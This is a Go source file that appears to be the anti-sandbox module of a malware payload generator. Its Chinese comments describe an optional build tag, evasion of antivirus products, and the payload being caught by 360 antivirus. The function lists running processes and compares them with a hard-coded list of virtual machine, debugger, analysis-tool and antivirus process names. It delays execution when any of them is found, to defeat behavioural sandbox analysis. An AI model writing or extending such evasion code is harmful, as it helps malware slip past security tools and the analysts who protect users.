//go:build windows && evasionscan

package main

import (
	"strings"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// 主动反沙箱进程检测（**需显式构建标签 evasionscan 才编译**，默认关闭）。
//
// 为什么默认关闭（v1.3.4）：
//  1. CreateToolhelp32Snapshot 全量进程枚举 + 与安全软件进程名比对，是 360/电脑管家/
//     火绒等国产杀软主动防御**明确拦截**的对抗行为 —— 实测本机（装有 360）上带此逻辑
//     的载荷一启动即被拒（Access is denied）并删除文件；
//  2. 本文件参与编译时，38 个安全软件/分析工具进程名字符串会进入载荷；且必须静态
//     导入 toolhelp32 API，绕过 apihash"零 API 明文 + 不调 GetProcAddress"的免杀路径。
//
// 因此它是**可选**能力：只有明确需要"识别分析环境并延迟"时，才在生成载荷时勾选
// "主动反沙箱进程检测"（服务端加 -tags evasionscan）。
func evasionSuspectDelay() time.Duration {
	var delay time.Duration

	suspects := []string{
		"vboxservice", "vboxtray", "vbox", "vmwaretray", "vmwareuser",
		"vmacthlp", "vmsrvc", "vmtoolsd", "sandboxie", "sbiesvc",
		"sbiectrl", "procmon", "procmon64", "tcpview", "autoruns",
		"wireshark", "fiddler", "charles", "burpsuite", "ollydbg",
		"x64dbg", "windbg", "ida64", "ida",
		// 主动防御/安全软件特征进程（命中即延迟，干扰行为沙箱判定）
		"qihoo", "qhsafetray", "qhactivedefense", "zhudongfangyu",
		"360tray", "360safe", "360sd", "360se", "360zip", "huorong",
		"hipsdaemon", "sysdiag", "wsctrl", "kxescore", "kxetray",
	}

	snap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0
	}
	defer windows.CloseHandle(snap)

	var pe windows.ProcessEntry32
	pe.Size = uint32(unsafe.Sizeof(pe))
	for e := windows.Process32First(snap, &pe); e == nil; e = windows.Process32Next(snap, &pe) {
		name := strings.ToLower(windows.UTF16ToString(pe.ExeFile[:]))
		for _, s := range suspects {
			if strings.Contains(name, s) {
				return 5 * time.Second
			}
		}
	}
	return delay
}
